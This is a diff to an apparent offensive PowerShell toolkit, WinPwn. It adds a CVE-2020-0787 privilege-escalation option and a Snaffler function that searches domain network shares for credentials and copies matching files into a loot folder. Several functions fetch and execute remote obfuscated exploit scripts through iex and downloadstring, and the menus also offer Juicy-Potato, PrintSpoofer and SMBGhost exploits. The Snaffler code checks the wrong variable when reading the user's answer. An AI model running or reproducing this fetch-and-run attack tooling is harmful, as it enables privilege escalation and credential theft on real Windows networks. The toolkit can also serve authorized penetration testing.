@@ -622,10 +622,11 @@ __        ___       ____
         Write-Host -ForegroundColor Green '7. CVE-2019-1129/1130 - Race Condition, multiples cores needed - July 2019! '
 	    Write-Host -ForegroundColor Green '8. CVE-2019-1215 - September 2019 - x64 only! '
 	    Write-Host -ForegroundColor Green '9. CVE-2020-0683 - February 2020 - x64 only! '
-        Write-Host -ForegroundColor Green '10. CVE-2020-0796 - March 2020 - no bind shell! '
-        Write-Host -ForegroundColor Green '11. Juicy-Potato Exploit from SeImpersonate or SeAssignPrimaryToken to SYSTEM!'
-        Write-Host -ForegroundColor Green '12. PrintSpoofer - Abusing Impersonation Privileges on Windows 10 and Server 2019!'
-        Write-Host -ForegroundColor Green '13. Exit. '
+        Write-Host -ForegroundColor Green '10. CVE-2020-0796 - March 2020 - SMBGhost only SMBV3 with compression - no bind shell! '
+	Write-Host -ForegroundColor Green '11. CVE-2020-0787 - March 2020 - all windows versions - BITSArbitraryFileMove ! '
+        Write-Host -ForegroundColor Green '12. Juicy-Potato Exploit from SeImpersonate or SeAssignPrimaryToken to SYSTEM!'
+        Write-Host -ForegroundColor Green '13. PrintSpoofer - Abusing Impersonation Privileges on Windows 10 and Server 2019!'
+        Write-Host -ForegroundColor Green '14. Exit. '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
 
@@ -639,13 +640,14 @@ __        ___       ____
             6{cve-2019-1069}
             7{CVE-2019-1129}
 	        8{CVE-2019-1215}
-	        9{CVE-2020-0683}
-            10{cve-2020-0796}
-            11{juicypot}
-            12{printspoofer}
+	        9{CVE-2020-0683-lpe}
+            10{cve-2020-0796-lpe}
+            11{cve-2020-0787-lpe}
+	    12{juicypot}
+            13{printspoofer}
        }
     }
- While ($masterquestion -ne 13)
+ While ($masterquestion -ne 14)
 
 }
 
@@ -657,10 +659,16 @@ function testtemp
  }
 }
 
-function cve-2020-0796
+function cve-2020-0796-lpe
 {
     iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/cve-2020-0683.ps1')
     cve-2020-0796
+}
+
+function cve-2020-0787-lpe
+{
+	iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/cve-2020-0787.ps1')
+	cve-2020-0787
 }
 
 function printspoofer
@@ -669,7 +677,7 @@ function printspoofer
     printspoof
 }
 
-function CVE-2020-0683
+function CVE-2020-0683-lpe
 {
     if ([Environment]::Is64BitProcess)
     {
@@ -1519,6 +1527,7 @@ __        ___       ____
         printercheck -noninteractive
         RBCD-Check -noninteractive
         GPORemoteAccessPolicy -noninteractive
+	Snaffler -noninteractive
         return;
     }
     
@@ -1534,7 +1543,7 @@ __        ___       ____
         Write-Host -ForegroundColor Green '7. Start MS-RPRN RPC Service Scan! '
         Write-Host -ForegroundColor Green '8. Start PowerUpSQL Checks!'
         Write-Host -ForegroundColor Green '9. Search for MS17-10 vulnerable Windows Servers in the domain! '
-        Write-Host -ForegroundColor Green '10. Check Domain Network-Shares for cleartext passwords using passhunt.exe! '
+        Write-Host -ForegroundColor Green '10. Check Domain Network-Shares for cleartext passwords! '
         Write-Host -ForegroundColor Green '11. Check domain Group policies for common misconfigurations using Grouper2! '
         Write-Host -ForegroundColor Green '12. Search for bluekeep vulnerable Windows Systems in the domain! '
         Write-Host -ForegroundColor Green '13. Search for potential vulnerable web apps (low hanging fruits)! '
@@ -1558,7 +1567,7 @@ __        ___       ____
              7{spoolvulnscan}
              8{powerSQL}
              9{MS17-10}
-             10{passhunt -domain $true}
+             10{domainshares}
              11{GPOAudit}
              12{bluekeep}
              13{fruit}
@@ -1570,6 +1579,71 @@ __        ___       ____
        }
     }
  While ($masterquestion -ne 19)
+}
+
+function domainshares
+{
+  @'
+
+             
+__        ___       ____                 
+\ \      / (_)_ __ |  _ \__      ___ __  
+ \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
+  \ V  V / | | | | |  __/ \ V  V /| | | |
+   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
+
+   --> DomainShares
+
+'@
+    do
+    {
+        Write-Host "================ WinPwn ================"
+        Write-Host -ForegroundColor Green '1. Passhunt search for Powerview found shares!'
+        Write-Host -ForegroundColor Green '2. Run Snaffler! '
+        Write-Host -ForegroundColor Green '3. Exit. '
+        Write-Host "================ WinPwn ================"
+        $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
+
+        Switch ($masterquestion) 
+        {
+             1{passhunt -domain $true}
+             2{Snaffler}
+       }
+    }
+ While ($masterquestion -ne 3)
+
+}
+
+function Snaffler
+{
+    [CmdletBinding()]
+
+    Param
+    (   
+        [Switch]
+        $noninteractive
+    )
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    pathcheck
+    iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Snaffler.ps1')
+    if (!$noninteractive)
+    {
+        Write-Host -ForegroundColor Yellow "Get a copy of all found files to the loot folder?"
+        $answer = Read-Host
+	if ($othersystems -eq "yes" -or $othersystems -eq "y" -or $othersystems -eq "Yes" -or $othersystems -eq "Y")
+	{
+		mkdir $currentPath\LootFiles
+        	Invoke-Snaffler -command "-u -s -m $currentPath\LootFiles\ -o $currentPath\DomainRecon\Snaffler.txt"
+	}
+	else
+	{
+		Invoke-Snaffler -command "-u -s -o $currentPath\DomainRecon\Snaffler.txt"
+	}
+    }
+    else
+    {
+    	Invoke-Snaffler -command "-u"
+    }
 }
 
 function spoolvulnscan
